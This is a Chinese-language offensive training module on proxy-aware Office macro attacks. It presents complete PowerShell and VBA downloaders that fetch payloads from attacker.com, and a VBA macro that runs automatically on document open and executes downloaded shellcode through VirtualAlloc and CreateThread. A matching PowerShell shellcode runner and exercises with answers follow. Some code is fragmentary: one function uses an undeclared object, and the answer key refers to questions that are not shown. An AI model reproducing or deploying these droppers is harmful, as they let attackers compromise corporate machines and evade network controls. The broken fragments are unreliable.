# Module 03: Office 宏攻击

## 第五节：代理感知通信

### 为什么需要代理感知？

在企业环境中，网络流量通常需要通过代理服务器：

```
内网主机 → 代理服务器 → 防火墙 → 互联网
              ↑
         可能需要认证
```

如果我们的 payload 不支持代理，就无法建立反向连接。

---

## 一、企业网络代理架构

### 1.1 常见代理类型

| 类型 | 说明 | 端口 |
|------|------|------|
| HTTP 代理 | 处理 HTTP/HTTPS 流量 | 8080, 3128 |
| SOCKS 代理 | 通用代理协议 | 1080 |
| 透明代理 | 用户无感知 | - |
| 认证代理 | 需要用户名密码 | - |

### 1.2 代理检测方法

```
Windows 代理设置位置:
1. 系统代理: 控制面板 → Internet 选项 → 连接 → 局域网设置
2. 注册表: HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
3. 环境变量: HTTP_PROXY, HTTPS_PROXY
4. PAC 文件: 自动配置脚本
```

## 二、PowerShell 代理感知

### 2.1 获取系统代理设置

```powershell
# 方法 1: 使用 WebRequest
$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$proxyUri = $proxy.GetProxy("http://www.google.com")
Write-Host "Proxy: $proxyUri"

# 方法 2: 读取注册表
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
$proxyEnabled = (Get-ItemProperty -Path $regPath).ProxyEnable
$proxyServer = (Get-ItemProperty -Path $regPath).ProxyServer
Write-Host "Enabled: $proxyEnabled, Server: $proxyServer"

# 方法 3: 使用 .NET
$webProxy = [System.Net.WebProxy]::GetDefaultProxy()
Write-Host "Default Proxy: $($webProxy.Address)"
```

### 2.2 配置 WebClient 使用代理

```powershell
# 创建 WebClient
$wc = New-Object System.Net.WebClient

# 使用系统默认代理
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()

# 使用当前用户凭据进行代理认证
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# 下载文件
$wc.DownloadString("http://attacker.com/script.ps1")
```

### 2.3 完整的代理感知下载器

```powershell
# ============================================
# 代理感知下载器
# 自动检测并使用系统代理
# ============================================

function Download-WithProxy {
    param(
        [string]$Url
    )

    # 创建 WebClient
    $wc = New-Object System.Net.WebClient

    # 配置代理
    $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
    $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $wc.Proxy = $proxy

    # 设置 User-Agent (模拟正常浏览器)
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

    try {
        $content = $wc.DownloadString($Url)
        return $content
    }
    catch {
        Write-Host "Download failed: $_"
        return $null
    }
}

# 使用示例
$script = Download-WithProxy -Url "http://attacker.com/payload.ps1"
if ($script) {
    Invoke-Expression $script
}
```

## 三、VBA 代理感知

### 3.1 使用 WinHTTP

```vba
' ============================================
' VBA 代理感知下载器
' 使用 WinHTTP 自动处理代理
' ============================================

Function DownloadWithProxy(url As String) As String
    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

    ' 设置代理自动检测
    http.SetProxy 1  ' HTTPREQUEST_PROXYSETTING_PRECONFIG

    ' 或者手动设置代理
    ' http.SetProxy 2, "proxy.company.com:8080", ""

    ' 发送请求
    http.Open "GET", url, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.Send

    ' 返回响应
    If http.Status = 200 Then
        DownloadWithProxy = http.ResponseText
    Else
        DownloadWithProxy = ""
    End If
End Function

Sub TestDownload()
    Dim content As String
    content = DownloadWithProxy("http://attacker.com/test.txt")
    MsgBox content
End Sub
```

### 3.2 使用 MSXML2

```vba
Function DownloadMSXML(url As String) As String

    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.Send

    If http.Status = 200 Then
        DownloadMSXML = http.responseText
    Else
        DownloadMSXML = ""
    End If
End Function
```

## 五、完整的代理感知 VBA 宏

### 5.1 集成代码

```vba
' ============================================
' 代理感知 VBA Shellcode Runner
' 功能：自动检测代理，下载并执行 shellcode
' ============================================

Option Explicit

' Win32 API 声明
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#End If

Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Sub AutoOpen()
    Main
End Sub

Sub Document_Open()
    Main
End Sub

Sub Main()
    ' 下载 shellcode
    Dim shellcodeStr As String
    shellcodeStr = DownloadShellcode("http://attacker.com/shellcode.txt")

    If Len(shellcodeStr) = 0 Then
        Exit Sub
    End If

    ' 解析 shellcode
    Dim shellcode() As Byte
    shellcode = ParseShellcode(shellcodeStr)

    ' 执行
    ExecuteShellcode shellcode
End Sub

Function DownloadShellcode(url As String) As String
    On Error Resume Next

    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

    ' 使用系统代理设置
    http.SetProxy 1  ' HTTPREQUEST_PROXYSETTING_PRECONFIG

    ' 设置超时
    http.SetTimeouts 30000, 30000, 30000, 30000

    ' 发送请求
    http.Open "GET", url, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.Send

    If http.Status = 200 Then
        DownloadShellcode = http.ResponseText
    Else
        DownloadShellcode = ""
    End If
End Function

Function ParseShellcode(shellcodeStr As String) As Byte()
    ' 假设 shellcode 是逗号分隔的十进制数字
    ' 例如: "252,72,131,228,240,232,..."

    Dim parts() As String
    parts = Split(shellcodeStr, ",")

    Dim shellcode() As Byte
    ReDim shellcode(UBound(parts))

    Dim i As Long
    For i = 0 To UBound(parts)
        shellcode(i) = CByte(Trim(parts(i)))
    Next i

    ParseShellcode = shellcode
End Function

Sub ExecuteShellcode(shellcode() As Byte)
    Dim addr As LongPtr
    Dim hThread As LongPtr
    Dim threadId As Long
    Dim i As Long

    ' 分配内存
    addr = VirtualAlloc(0, UBound(shellcode) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If addr = 0 Then Exit Sub

    ' 复制 shellcode
    For i = 0 To UBound(shellcode)
        RtlMoveMemory addr + i, shellcode(i), 1
    Next i

    ' 执行
    hThread = CreateThread(0, 0, addr, 0, 0, threadId)
    If hThread = 0 Then Exit Sub

    WaitForSingleObject hThread, -1
End Sub
```

## 六、代码汇总

### 6.1 PowerShell 代理感知模板

```powershell
# ============================================
# PowerShell 代理感知 Shellcode Runner
# ============================================

# 配置代理
$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# 创建 WebClient
$wc = New-Object System.Net.WebClient
$wc.Proxy = $proxy
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

# 下载 shellcode
$shellcodeUrl = "http://attacker.com/shellcode.bin"
$shellcode = $wc.DownloadData($shellcodeUrl)

# Win32 API
$code = @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr h, uint m);
}
"@
Add-Type $code

# 执行
$addr = [K32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
$thread = [K32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[K32]::WaitForSingleObject($thread, 0xFFFFFFFF)
```

### 6.2 VBA 代理检测函数

```vba
' 检测系统代理设置
Function GetSystemProxy() As String
    On Error Resume Next

    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")

    ' 读取注册表
    Dim regPath As String
    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"

    Dim proxyEnabled As Long
    proxyEnabled = wsh.RegRead(regPath & "ProxyEnable")

    If proxyEnabled = 1 Then
        GetSystemProxy = wsh.RegRead(regPath & "ProxyServer")
    Else
        GetSystemProxy = ""
    End If
End Function
```

### 实践题

1. 编写一个 PowerShell 脚本，检测当前系统是否配置了代理，如果有则输出代理地址。

2. 修改 VBA 下载函数，使其在代理认证失败时尝试直接连接。

### 答案

**选择题**：1-B, 2-B, 3-B, 4-B, 5-B

**实践题参考答案**：

1. 代理检测脚本：
```powershell
$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$testUrl = "http://www.google.com"
$proxyUri = $proxy.GetProxy($testUrl)

if ($proxyUri.AbsoluteUri -ne $testUrl) {
    Write-Host "Proxy configured: $($proxyUri.AbsoluteUri)"
} else {
    Write-Host "No proxy configured (direct connection)"
}
```

2. 带回退的下载函数：
```vba
Function DownloadWithFallback(url As String) As String
    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

    ' 首先尝试使用系统代理
    http.SetProxy 1
    http.Open "GET", url, False
    On Error Resume Next
    http.Send

    If http.Status <> 200 Then
        ' 代理失败，尝试直接连接
        Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
        http.SetProxy 0  ' 直接连接
        http.Open "GET", url, False
        http.Send
    End If

    If http.Status = 200 Then
        DownloadWithFallback = http.ResponseText
    Else
        DownloadWithFallback = ""
    End If
End Function
```
